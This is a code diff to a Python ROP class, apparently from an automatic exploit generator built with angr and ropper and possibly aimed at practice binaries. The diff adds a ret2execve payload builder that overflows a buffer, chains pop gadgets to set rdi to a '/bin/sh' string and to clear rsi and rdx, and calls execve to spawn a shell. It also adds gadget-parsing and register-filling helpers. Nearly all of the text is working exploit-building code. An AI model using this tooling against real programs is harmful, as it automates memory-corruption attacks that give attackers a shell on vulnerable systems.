@@ -3,11 +3,12 @@ import angr, claripy
 import subprocess
 
 class ROP:
-    def __init__(self, filename, properties):
-        self.filename = filename
+    def __init__(self, analysis, properties):
+        self.analysis = analysis
+        self.filename = analysis.binary
         self.properties = properties
-        self.offset = Get2overflow(filename).buf()
-        self.e = ELF(filename)
+        self.offset = Get2overflow(self.filename).buf()
+        self.e = ELF(self.filename)
         self.gadgets = []
 
     def ret2win(self):
@@ -16,8 +17,14 @@ class ROP:
         return payload
 
     def ret2execve(self):
+        self.find_gadgets()         
         payload = cyclic(self.offset)
-        
+        payload += self.fill_reg("rdi", self.analysis.get_binsh())
+        payload += self.fill_reg("rsi", 0)
+        payload += self.fill_reg("rdx", 0)
+        payload += p64(self.e.sym["execve"])
+
+        return payload
 
     def ret2syscall(self):
         pass
@@ -26,7 +33,7 @@ class ROP:
         print("example support function")
 
     def find_gadgets(self):
-        cmd = "ropper --nocolor -f " + self.filename + " 2>/dev/null | getp 0x"
+        cmd = "ropper --nocolor -f " + self.filename + " 2>/dev/null | grep 0x"
         raw_gadgets = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
         for i in sorted(raw_gadgets.communicate()[0].decode("utf-8").split("\n"), key=len):
             self.gadgets.append(i.replace(" nop;", ""))
@@ -36,7 +43,9 @@ class ROP:
 
     def get_pops(self):
         pops = []
-        for i in self.gadgets
+        for i in self.gadgets:
+            pops.append(i) if "pop" in i else next
+        return pops
 
     def num_pops(self, string):
         return string.count('pop')
@@ -44,9 +53,18 @@ class ROP:
     def pop_reg(self, reg):
         for i in self.get_pops():
             if ': pop ' + reg + "; ret;" in i:
-                return [i.split(":")[0], 1] # return address
+                return [i.split(":")[0], 1]
             elif "pop " + reg in i:
                 return [i.split(":")[0], self.num_pops(i)]
+    
+    def fill_reg(self, reg, val):
+        chain = p64(int(self.pop_reg(reg)[0], 16))
+        for i in range(self.pop_reg(reg)[1]):
+            chain += p64(int(val))
+
+        return chain
+
+
 
 class Get2overflow:
     def __init__(s, binary):
